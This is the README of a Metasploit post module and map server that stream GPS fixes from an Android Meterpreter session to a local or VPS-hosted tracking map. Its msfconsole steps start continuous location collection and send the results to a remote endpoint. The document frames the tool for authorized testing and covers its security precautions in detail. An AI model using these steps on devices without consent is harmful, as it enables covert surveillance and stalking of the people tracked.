# Cartochron

Cartochron records and displays GPS observations for authorized security
research. It started as `msf-gps-map`, and retains its small HTTP interface
and Metasploit integration. The standalone server can run with an in-memory
SQLite database or preserve observations on disk. Each recording run has a
track identifier, and the HTTP API supports bounded historical queries.
The Leaflet viewer supports selecting tracks, inspecting live positions, and
exploring historical time intervals. Repository and server filenames remain
unchanged.

## How it works

1. An authorized Android Meterpreter session provides coordinates to the
   `gps_streamer` post module, using `geolocate` or `wlan_geolocate`.
2. The module posts `{"lat": ..., "lon": ..., "track_id": ...}` to the
   server. A new random `track_id` is generated once per Metasploit job.
3. `map_server.py` records observations in SQLite, in RAM by default or
   in a persistent database when `--db` is specified. The browser selects a
   run, follows its latest positions in Live mode, or reads a fixed time
   interval in History mode. Observations from different runs are not joined.

The Metasploit operator sends HTTP requests directly to the map server.
The Android session does not connect to the map server itself.

## Setup

Python 3 and Ruby (for the Metasploit module) are required. The map server
uses only the Python standard library.

```sh
make                  # Fetch and integrity-check local Leaflet 1.9.4 assets
make install-local    # Install the module into ~/.msf4/modules/
make check            # Run Python/Ruby tests and JS tests if Node.js is installed
make check-viewer     # Require Node.js; run the browser-logic tests
```

## Local use (default)

Start the map server:

```sh
python3 map_server.py
```

Open <http://127.0.0.1:8765>. No credentials are required unless you
explicitly enable authentication.

In `msfconsole`, after installing the module:

```text
msf6 > reload_all
msf6 > use post/android/gather/gps_streamer
msf6 post(android/gather/gps_streamer) > set SESSION <id>
msf6 post(android/gather/gps_streamer) > set INTERVAL 3
msf6 post(android/gather/gps_streamer) > run -j
```

The default `ENDPOINT` is `http://127.0.0.1:8765/api/position`.
Stop the background job using `jobs -k <JobID>`. The module prints the
recording-run ID when starting. `TRACK_ID` is optional; leave it empty to
create a fresh random ID each run. Set it explicitly (1–64 ASCII letters,
digits, `.`, `_`, or `-`, starting with a letter or digit) only when you
intentionally want multiple jobs to append to the same recording run.
A track ID groups observations; it is **not** a device identifier or an
authorization credential.

For a different local port:

```sh
python3 map_server.py --port 9876
```

Set `ENDPOINT` to `http://127.0.0.1:9876/api/position` in the module.

## Recording to a SQLite file (optional)

No database server or Python package installation is needed. The default
command above still holds at most 1,000 observations in memory and discards
them on exit. To preserve observations across restarts:

```sh
install -d -m 700 "$HOME/.local/share/cartochron"
python3 map_server.py --db "$HOME/.local/share/cartochron/observations.sqlite3"
```

`--db` creates a private file (mode `0600`) or opens an existing compatible
Cartochron database. The parent directory must already exist. Existing
world/group-accessible files and unrelated or unsupported schemas are refused.
Protect the database, its directory, and any backups: location history is
sensitive data. Do not commit database files to Git.

**Persistence and map history are different features.** With `--db`, every
accepted observation remains stored. The browser can select an interval from
that history; Live mode follows at most 1,000 recent points from its selected
run. In RAM mode, only the latest 1,000 observations *across all runs* survive.
No older rows are silently deleted from a persistent database.

For backups, stop the server before copying the database file, or use SQLite's
backup facilities while it is running. There is no retention or automatic
pruning in persistent mode; the operator owns storage and deletion policy.

## Map navigation

The track selector lists the 100 most recently updated runs (the catalogue
reports when additional runs exist). When the page opens, it initially selects
the most recently updated run. The selection remains pinned even if another
producer starts recording.

- **Live** polls up to 1,000 recent observations for the selected run, follows
  its last received position, and shows its receipt timestamp. No active
  Android session is necessary to view previously received data.
- **History** lets you set **From** and **To** using the browser's *local*
  clock. Press **Show interval** to query `[from, to)`; the server converts the
  timestamps to UTC. Use **Inspect point** to examine the position and receipt
  time of each displayed observation.
- The browser loads 1,000 historical points at a time. **Load more** fetches
  the next page without losing earlier points. After 5,000 displayed points,
  narrow the interval to inspect the remainder. The interface reports partial
  results; it does not silently simplify a route or claim completeness.
- A gap greater than **10 minutes between consecutive receipt times** breaks
  the line into separate route segments. A straight line between sparse GPS
  fixes is only a visualization, not proof of the path traveled. Green marks
  the first displayed fix, orange the last, and purple the inspected fix.

History uses the server's **receipt times**. These are not guaranteed to equal
GPS acquisition times. Map tiles are fetched separately from OpenStreetMap;
an Internet connection is needed for the background map.

## Visual demo (no Metasploit required)

Create a **new, disposable** SQLite database containing synthetic observations:

```sh
make                       # Fetch Leaflet assets once, if necessary
python3 demo.py --db /tmp/cartochron-demo.sqlite3
python3 map_server.py --db /tmp/cartochron-demo.sqlite3
```

Open <http://127.0.0.1:8765/>. The demo has five recording runs:

| Run | What to inspect |
| --- | --- |
| `demo-city-loop` | 75 fixes; History shows two route segments across a 21.5-minute gap |
| `demo-river` | 30 fixes in a different city; selecting it never joins the first route |
| `demo-crossing` | 25 fixes crossing the city loop's geography at a different time |
| `demo-single-point` | One fix, with no fabricated polyline |
| `demo-long-history` | 1,205 fixes; History shows **Load more** after the first 1,000 |

The fixture uses dates relative to when it is generated, so the default
historical interval includes the example points. `demo.py` refuses to
overwrite an existing file; choose a fresh path if you want to regenerate it.
It writes directly to a new SQLite database rather than pretending to be a
real device. Never run the demo against an existing observation database.

The map now has small inspection nodes along the displayed route. Hover over a
node to see the recording run, receipt time, and coordinates. Click a node or
a blue route segment to select the nearest **recorded** fix; in History mode,
this also synchronizes the inspection slider. Start/end fixes have distinct
colors, and both sides of recording gaps remain visible. Long tracks display
fewer dots to avoid overloading the map; clicking the line still locates fixes
between them. Live mode opens an inspection popup on click.

In **History** mode, **Overlay run** draws one other recording run in amber.
**Overlay time** defaults to **Entire run**, so a run recorded yesterday can
be compared geographically with a run recorded today. Choose **Same interval**
to show only overlay observations in the primary run's selected `[from, to)`
window. The viewer tells you if none fall in that interval; this is not a
fetch failure. On overlay selection, the map fits both visible routes so a
run in another city is not hidden outside the current viewport. The map may
zoom out substantially if the runs are far apart.

The overlay's nodes and lines are independently inspectable; the main slider
still controls only the primary run. For the demo, select `demo-city-loop`,
enter History mode, and overlay `demo-crossing`. Their routes cross
geographically but the relevant observations were recorded at different
times: **a crossing is not proof of a meeting**. Try selecting `demo-replay`
(after synthetic replay) and overlaying `demo-long-history`: **Entire run**
shows both, whereas **Same interval** shows zero overlay fixes for a recent
narrow replay window. Overlays are bounded to 5,000 points and identify partial
results. Live mode still follows only the selected recording run.

`make check` tests the database fixture and API automatically. The demo is for
manual browser inspection: select a track, change the time range, move the
inspection slider, and verify the path visually. It requires no HTTP posting,
credentials, real GPS hardware, or Metasploit session. To dispose of it, stop
the server and delete only the demo SQLite file.

## Synthetic live-stream rehearsal

The fixture above tests History mode, but doesn't exercise HTTP ingestion or
Live mode. For that, use two **separate** disposable databases. In three
terminals:

```sh
# Terminal 1 — generate a source fixture once
python3 demo.py --db /tmp/cartochron-source.sqlite3

# Terminal 2 — start an empty, local test receiver
python3 map_server.py --db /tmp/cartochron-live.sqlite3

# Terminal 3 — POST a sample every second using the real ingestion API
python3 replay.py --db /tmp/cartochron-source.sqlite3 \
    --track demo-city-loop --as-track demo-replay --count 30 --interval 1
```

Open <http://127.0.0.1:8765/> and select `demo-replay` in **Live** mode.
The route grows while replay runs; History mode can inspect received points
and their actual server receipt times. Stop replay with Ctrl-C and verify that
the last point stays visible. Restart the server using the same receiver
database and verify the observations remain. Use different paths, or remove
only your disposable files, for subsequent runs: `demo.py` refuses to overwrite
an existing fixture and `map_server.py` retains existing database contents.

`replay.py` deliberately accepts **only an unauthenticated loopback HTTP
endpoint**, defaults to `127.0.0.1:8765`, and never modifies the source
fixture. It is a manual test driver, not a replacement for an authorized
GPS producer. Use the actual Metasploit adapter to test authentication and
remote transport; do not send synthetic fixes to a production history.

## First live-device field test

Use a device you own or are explicitly authorized to test, and a separate
persistent test database. Before walking, verify:

1. Start the server, open the map, and confirm it loads locally.
2. In `msfconsole`, run `reload_all`, select `post/android/gather/gps_streamer`,
   set the correct `SESSION` and `INTERVAL 5`, then `run -j`. Record the
   printed `track_id` without publishing raw GPS coordinates.
3. Verify that the server accepted observations and that this recording run
   appears under `GET /api/tracks` and in the viewer's track selector.
4. Walk a short known route and inspect Live updates. Stop the job with
   `jobs -k <JobID>`; verify History has a fixed, inspectable route.
5. Restart the map server with the same `--db` path and confirm the history
   survives. Test a new job and confirm it does not join the earlier route.
6. If using a VPS, test the HTTPS/authentication boundary separately. Check
   failed credentials are rejected and never disable TLS verification to
   make a test succeed.

Observe actual receipt timestamps, poll intervals, missing fixes, connection
failures, and GPS acquisition failures. The server records **receipt time**,
not independently verified satellite-fix time. Long observation gaps are not
proof of continuous movement. Never place real location data or passwords in
public bug reports or test fixtures.

## VPS / network use

`--bind` controls the listening IPv4 address (`127.0.0.1` by default),
and `--port` the TCP port (`8765` by default). Both are optional.
The server uses plain HTTP; **Basic authentication does not provide encryption**.
Do not expose location history or credentials to the public Internet over HTTP.

### 1. Set up optional authentication

Create a private credential file on the server, outside the repository:

```sh
install -d -m 700 "$HOME/.config/msf-gps-map"
umask 077
printf 'operator:%s\n' "$(openssl rand -base64 32)" > "$HOME/.config/msf-gps-map/auth"
chmod 600 "$HOME/.config/msf-gps-map/auth"
```

The file contains one ASCII `username:password` line. The first colon
separates the fields; passwords may contain additional colons. The server
reads the file at startup and rejects group/world-accessible files.
Never commit this file to Git or pass credentials in a URL.

Enable it with `--auth-file`:

```sh
python3 map_server.py --port 9876 --auth-file "$HOME/.config/msf-gps-map/auth"
```

A browser now prompts for the same credentials before displaying the map.
`GET /`, static map assets, `GET /api/points`, and `POST /api/position` all
require authentication. Without `--auth-file`, the original unauthenticated
behavior is preserved.

### 2. Make the map accessible remotely

**Recommended for an Internet-facing VPS:** keep Python on loopback and
put a TLS reverse proxy in front of it. For example, with Caddy and a
DNS name pointing to your VPS:

```caddyfile
gps.example.com {
    reverse_proxy 127.0.0.1:9876
}
```

Keep TCP port 9876 blocked from external access; expose only HTTPS on 443.
Open `https://gps.example.com/` in a browser. The reverse proxy must pass
the `Authorization` and `Host` headers (Caddy does this by default).

**For a private VPN or otherwise restricted network:** the server can listen
on all IPv4 interfaces. The port must be reachable only by trusted clients:

```sh
python3 map_server.py --bind 0.0.0.0 --port 9876 \
    --auth-file "$HOME/.config/msf-gps-map/auth"
```

The URL uses your VPS's actual IP or DNS name, **not** `0.0.0.0`.
If you omit `--auth-file` in this mode, both GPS ingestion and the map
history are accessible to anybody who can reach the port.

### 3. Point the Metasploit module at the VPS

On the Metasploit operator's machine:

```text
msf6 post(android/gather/gps_streamer) > set ENDPOINT https://gps.example.com/api/position
msf6 post(android/gather/gps_streamer) > set MAP_USER operator
msf6 post(android/gather/gps_streamer) > set MAP_PASSWORD <password-from-auth-file>
msf6 post(android/gather/gps_streamer) > run -j
```

`MAP_USER` and `MAP_PASSWORD` are optional, but must be supplied together.
They are HTTP Basic credentials for the map server, **not** the `API_KEY`
used by `wlan_geolocate` as a fallback. Do not put the password into
`ENDPOINT`. Metasploit's datastore, command history, and console recordings
may expose values entered using `set`; protect them accordingly.

The module enables TLS for `https://` URLs, uses the system's normal
certificate validation, and reports non-2xx server responses as failures.
Use a valid certificate rather than disabling verification.

## Tracks and historical queries

A recording run is identified by `track_id`. Existing senders that POST only
`lat` and `lon` continue to work and write to the `legacy` track. The server
still returns the original `lat`, `lon`, and `time` fields on successful POST.
`time` is the server's **receipt time**, not necessarily the moment when a
GPS device obtained a fix. The database retains integer UTC milliseconds.

The API has three relevant GET operations:

| Endpoint | Response |
| --- | --- |
| `GET /api/points` | Original `{"points": [...]}` response, from the most recently updated run |
| `GET /api/points/recent?track_id=...` | Up to 1,000 newest points for an explicitly selected run (used by Live mode) |
| `GET /api/tracks` | Up to 100 run summaries, with counts and first/last receipt times; `truncated` reports if more exist |
| `GET /api/points?track_id=...` | Historical query ordered by receipt time, with an optional time range, page size, and continuation cursor |

For example, with a local server containing data for `lab-run-1`:

```sh
curl -fsSG 'http://127.0.0.1:8765/api/points' \
    --data-urlencode 'track_id=lab-run-1' \
    --data-urlencode 'from=2026-11-02T08:00:00Z' \
    --data-urlencode 'to=2026-11-02T18:00:00Z' \
    --data-urlencode 'limit=100'
```

The optional `from` and `to` timestamps are RFC3339 with timezone, at most
millisecond precision. An interval is `[from, to)`: inclusive start, exclusive
end. An omitted bound is open-ended. Values are converted to UTC.

Each historical response has this shape:

```json
{
  "track_id": "lab-run-1",
  "points": [
    {"id": 4, "received_ms": 1793620800000,
     "lat": 47.0, "lon": 28.0, "time": "2026-11-02T12:00:00.000+00:00"}
  ],
  "truncated": false,
  "next_cursor": null
}
```

Historical queries return up to 1,000 points per request (`limit=1..1000`,
default 1,000), ordered by `(received_ms, id)`. A truncated response supplies
`next_cursor`, a non-secret paging position. Request the same track and time
interval again with `cursor=<next_cursor>` to fetch the next page. Stop when
`next_cursor` is `null`. The cursor is not a database snapshot: if new
observations arrive during paging, the result set can change. Large histories
are never silently truncated without reporting that another page exists.

The Leaflet page uses these APIs for track selection and historical navigation.
The unfiltered endpoint remains available for older clients and still follows
the most recently ingested run.

## Manual ingestion test

With the default, unauthenticated local server:

```sh
curl -fsS http://127.0.0.1:8765/api/position \
    -H 'Content-Type: application/json' \
    -d '{"lat":47.000,"lon":28.000,"track_id":"lab-run-1"}'
```

For an authenticated HTTPS server:

```sh
curl -fsS --user operator https://gps.example.com/api/position \
    -H 'Content-Type: application/json' \
    -d '{"lat":47.000,"lon":28.000,"track_id":"lab-run-1"}'
```

`curl --user operator` prompts for the password without including it in
shell command history.

## Notes

- Without `--db`, at most 1,000 observations **across all runs** are kept in
  RAM and erased when the server exits. With `--db`, all accepted observations
  are retained on disk; no automatic retention policy is imposed.
- Unfiltered `GET /api/points` returns the latest 1,000 observations from the
  most recently updated run (backward compatibility). The viewer uses the
  explicitly selected run. Authentication protects the viewer and writer
  together, not as separate roles. Track IDs are not access controls; an
  authenticated viewer can query every track.
- The server checks Host and Origin headers. Local unauthenticated use retains
  strict loopback Host checking; remote Host names are accepted for network
  listeners and authenticated reverse-proxy deployments.
- Leaflet assets are vendored locally. An Internet connection is still needed
  to load OpenStreetMap tiles. Tile requests can reveal the viewed area to the
  tile provider.
- A public Python `ThreadingHTTPServer` is not a hardened production HTTP
  frontend. Use a reverse proxy, firewall, and sensible connection limits.

## Project files

```text
map_server.py          Python HTTP server and observation API
observation_store.py   SQLite storage (memory or disk)
index.html             Leaflet map page and controls
viewer.js              Live/history UI logic and map rendering
demo.py                Generate isolated synthetic browser fixtures
replay.py              Feed demo observations into a local HTTP listener
gps_streamer.rb         Metasploit Android post module
vendor_leaflet.py      Downloads and verifies pinned Leaflet assets
tests/                 Python HTTP and Ruby transport tests
Makefile               Vendor, install, and test commands
```

## Disclaimer

Use only for authorized security research, educational demonstrations, and
penetration tests with explicit consent. Unauthorized device tracking or
surveillance is not permitted.

## License

GPL-3.0-or-later; see `COPYING` and `COPYRIGHT`. Vendored Leaflet assets
retain their BSD-2-Clause license.

## Acknowledgments

Leaflet.js, OpenStreetMap contributors, and Rapid7 Metasploit Framework.
